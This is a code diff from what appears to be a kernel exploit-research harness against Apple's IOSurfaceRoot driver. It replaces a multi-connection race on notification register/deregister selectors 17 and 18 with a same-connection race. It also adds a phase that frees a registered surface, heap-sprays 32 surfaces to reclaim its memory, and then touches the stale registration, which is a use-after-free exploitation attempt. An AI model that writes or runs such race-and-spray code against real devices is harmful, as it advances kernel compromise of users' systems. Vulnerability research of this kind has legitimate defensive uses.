@@ -16906,88 +16906,114 @@ new_modes:
                 rlog("\n");
             }
 
-            /* Phase 5: Multi-connection race */
-            rlog("\n--- Phase 5: Multi-connection concurrent race ---\n");
+            /* Phase 5: Same-connection concurrent race (async reg vs sync dereg) */
+            rlog("\n--- Phase 5: Same-connection concurrent reg/dereg race ---\n");
 
-            /* Open a second connection */
-            io_service_t svc2 = IOServiceGetMatchingService(kIOMasterPortDefault,
-                IOServiceMatching("IOSurfaceRoot"));
-            io_connect_t conn2 = 0;
-            if (svc2) {
-                kr = IOServiceOpen(svc2, mach_task_self(), 0, &conn2);
-                IOObjectRelease(svc2);
-                rlog("  Second connection: 0x%x (kr=0x%x)\n", conn2, kr);
-            }
+            __block _Atomic int p5_reg_ok = 0, p5_dereg_ok = 0;
+            __block _Atomic int p5_dup = 0, p5_bad = 0, p5_other = 0;
+            __block _Atomic int p5_stop = 0;
+            __block int p5_rounds = rounds;
+            __block io_connect_t p5_conn = conn;
+            __block mach_port_t p5_port = wake_port;
 
-            if (conn2) {
-                /* Create a second wake port */
-                mach_port_t wake2 = MACH_PORT_NULL;
-                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wake2);
-                mach_port_insert_right(mach_task_self(), wake2, wake2, MACH_MSG_TYPE_MAKE_SEND);
+            dispatch_queue_t reg_q5 = dispatch_queue_create("p5reg", NULL);
+            dispatch_queue_t dereg_q5 = dispatch_queue_create("p5dereg", NULL);
 
-                __block _Atomic int mc_ok = 0, mc_dup = 0, mc_stale = 0, mc_other = 0;
-                __block _Atomic int mc_stop = 0;
-                __block int mc_rounds = rounds;
-                __block io_connect_t mc_conn1 = conn, mc_conn2 = conn2;
-                __block mach_port_t mc_port1 = wake_port, mc_port2 = wake2;
+            /* Thread 1: Spam async register (sel17) */
+            dispatch_async(reg_q5, ^{
+                uint8_t inp[24]; memset(inp, 0, 24);
+                memcpy(inp, &surf_id, 4);
+                uint64_t ref[1] = {0x45454545};
 
-                dispatch_queue_t q1 = dispatch_queue_create("mc1", NULL);
-                dispatch_queue_t q2 = dispatch_queue_create("mc2", NULL);
+                for (int i = 0; i < p5_rounds && !p5_stop; i++) {
+                    kern_return_t rk = IOConnectCallAsyncStructMethod(p5_conn, 17,
+                        p5_port, ref, 1, inp, 24, NULL, NULL);
+                    if (rk == 0) p5_reg_ok++;
+                    else if (rk == 0xE00002C9) p5_dup++;
+                    else p5_other++;
+                }
+                p5_stop = 1;
+            });
 
-                /* Thread 1: register on conn1, deregister on conn2 */
-                dispatch_async(q1, ^{
-                    uint8_t inp[24]; memset(inp, 0, 24);
-                    memcpy(inp, &surf_id, 4);
-                    uint64_t ref[1] = {0x43434343};
+            /* Thread 2: Spam sync deregister (sel18) */
+            dispatch_async(dereg_q5, ^{
+                uint8_t inp[24]; memset(inp, 0, 24);
+                memcpy(inp, &surf_id, 4);
 
-                    for (int i = 0; i < mc_rounds && !mc_stop; i++) {
-                        kern_return_t rk = IOConnectCallAsyncStructMethod(mc_conn1, 17,
-                            mc_port1, ref, 1, inp, 24, NULL, NULL);
-                        if (rk == 0) {
-                            mc_ok++;
-                            /* Immediately deregister from DIFFERENT connection */
-                            kern_return_t dk = IOConnectCallStructMethod(mc_conn2, 18,
-                                inp, 24, NULL, NULL);
-                            if (dk == 0) mc_ok++;
-                            else if (dk == 0xE00002D8) mc_stale++;
-                            else mc_other++;
-                        } else if (rk == 0xE00002C9) mc_dup++;
-                        else mc_other++;
+                while (!p5_stop) {
+                    kern_return_t rk = IOConnectCallStructMethod(p5_conn, 18,
+                        inp, 24, NULL, NULL);
+                    if (rk == 0) p5_dereg_ok++;
+                    else if (rk == 0xE00002C2) p5_bad++;
+                    else p5_other++;
+                }
+            });
+
+            dispatch_sync(reg_q5, ^{});
+            usleep(50000);
+
+            rlog("  Same-conn race: reg_ok=%d dereg_ok=%d dup=%d bad=%d other=%d\n",
+                 p5_reg_ok, p5_dereg_ok, p5_dup, p5_bad, p5_other);
+
+            /* Phase 6: Spray after race to detect reclaim */
+            rlog("\n--- Phase 6: Post-race spray + stale access test ---\n");
+
+            /* Register, destroy the surface, then try to access the registration */
+            for (int trial = 0; trial < 20; trial++) {
+                /* Create fresh surface */
+                int tw = 32, th = 32, tbpe = 4, tpf = 0x42475241;
+                CFNumberRef tn[4];
+                tn[0] = CFNumberCreate(NULL, kCFNumberIntType, &tw);
+                tn[1] = CFNumberCreate(NULL, kCFNumberIntType, &th);
+                tn[2] = CFNumberCreate(NULL, kCFNumberIntType, &tbpe);
+                tn[3] = CFNumberCreate(NULL, kCFNumberIntType, &tpf);
+                CFStringRef tk[] = {
+                    CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                    CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")
+                };
+                CFDictionaryRef tp = CFDictionaryCreate(NULL,
+                    (const void **)tk, (const void **)tn, 4,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                IOSurfaceRef ts = IOSurfaceCreate(tp);
+                uint32_t tid = ts ? IOSurfaceGetID(ts) : 0;
+
+                if (ts && tid) {
+                    uint8_t rinp[24]; memset(rinp, 0, 24);
+                    memcpy(rinp, &tid, 4);
+
+                    /* Register notification for this surface */
+                    uint64_t tref[1] = {0x46464646 + trial};
+                    kr = IOConnectCallAsyncStructMethod(conn, 17,
+                        wake_port, tref, 1, rinp, 24, NULL, NULL);
+
+                    if (kr == 0) {
+                        /* Destroy the surface while registration exists */
+                        CFRelease(ts);
+                        ts = NULL;
+
+                        /* Spray to reclaim the freed surface's backing */
+                        IOSurfaceRef spray_surfs[32];
+                        for (int si = 0; si < 32; si++) {
+                            spray_surfs[si] = IOSurfaceCreate(tp);
+                        }
+
+                        /* Try to trigger the notification on the now-stale entry */
+                        uint8_t dinp[24]; memset(dinp, 0, 24);
+                        memcpy(dinp, &tid, 4);
+                        kern_return_t dk = IOConnectCallStructMethod(conn, 18,
+                            dinp, 24, NULL, NULL);
+                        rlog("  Trial %d: tid=%u reg=OK dereg=0x%08x\n", trial, tid, dk);
+
+                        for (int si = 0; si < 32; si++)
+                            if (spray_surfs[si]) CFRelease(spray_surfs[si]);
+                    } else {
+                        rlog("  Trial %d: tid=%u reg=0x%08x\n", trial, tid, kr);
                     }
-                    mc_stop = 1;
-                });
+                }
 
-                /* Thread 2: register on conn2, deregister on conn1 */
-                dispatch_async(q2, ^{
-                    uint8_t inp[24]; memset(inp, 0, 24);
-                    memcpy(inp, &surf_id, 4);
-                    uint64_t ref[1] = {0x44444444};
-
-                    for (int i = 0; i < mc_rounds && !mc_stop; i++) {
-                        kern_return_t rk = IOConnectCallAsyncStructMethod(mc_conn2, 17,
-                            mc_port2, ref, 1, inp, 24, NULL, NULL);
-                        if (rk == 0) {
-                            mc_ok++;
-                            kern_return_t dk = IOConnectCallStructMethod(mc_conn1, 18,
-                                inp, 24, NULL, NULL);
-                            if (dk == 0) mc_ok++;
-                            else if (dk == 0xE00002D8) mc_stale++;
-                            else mc_other++;
-                        } else if (rk == 0xE00002C9) mc_dup++;
-                        else mc_other++;
-                    }
-                    mc_stop = 1;
-                });
-
-                dispatch_sync(q1, ^{});
-                usleep(50000);
-
-                rlog("  Multi-conn race: ok=%d dup=%d stale=%d other=%d\n",
-                     mc_ok, mc_dup, mc_stale, mc_other);
-
-                if (wake2 != MACH_PORT_NULL)
-                    mach_port_deallocate(mach_task_self(), wake2);
-                IOServiceClose(conn2);
+                if (ts) CFRelease(ts);
+                CFRelease(tp);
+                for (int ni = 0; ni < 4; ni++) CFRelease(tn[ni]);
             }
 
             mach_port_deallocate(mach_task_self(), wake_port);
